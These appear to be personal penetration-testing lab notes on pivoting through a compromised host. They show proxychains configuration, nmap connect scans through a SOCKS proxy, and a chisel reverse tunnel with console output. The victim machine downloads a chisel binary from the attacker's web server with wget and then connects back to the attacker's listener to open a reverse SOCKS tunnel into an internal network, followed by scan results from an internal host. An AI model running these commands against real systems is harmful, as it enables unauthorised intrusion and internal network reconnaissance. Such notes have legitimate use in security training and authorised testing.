# configure proxychains
$ sudo bash -c 'echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf'

# use it
$ sudo proxychains rdesktop 192.168.1.110
$ proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20

# NOTICE: -sT CONNECT scan is what works via proxy. -sS SYN scan will not. -sP -Pn ICMP will not.




# here we're going to prefer chisel and a socks5 proxy
# kali
$ npx http-server /usr/share/linux-binaries/static-tools -p 80 -a 192.168.119.198
# victim
$ wget http://192.168.119.198/chisel32
# kali listening (note: same version used for client and server)
$ ./chisel server -p 8443 --reverse
2021/10/12 18:27:11 server: Reverse tunnelling enabled
2021/10/12 18:27:11 server: Fingerprint 5kXrmXt4RNfif20C1y2AK4pL0BWCYqbq0f1aMciqY/0=
2021/10/12 18:27:11 server: Listening on http://0.0.0.0:8443
2021/10/12 18:27:13 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
# victim connecting
$ ./chisel32 client 192.168.119.198:8443 R:socks
2021/10/12 18:26:17 client: Connecting to ws://192.168.119.198:8443
2021/10/12 18:26:18 client: Connected (Latency 132.617021ms)
# chisel socks5 proxy is the greatest


export PORTS=22,80,222,10000
# write simple proxychains config to cwd
echo -e "[ProxyList]\nsocks5 127.0.0.1 1080" > .proxychains
proxychains -q -f .proxychains nmap -sT -d -vv -sC --script-timeout=30 -Pn --open -p $PORTS 10.1.1.1
# `-q` means quiet so proxychains won't stdout while nmap is stdout
# `-f` means load specific config file (the one we just created)
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack
80/tcp    open  http             syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: luigi remote web console
222/tcp   open  rsh-spx          syn-ack
10000/tcp open  snet-sensor-mgmt syn-ack
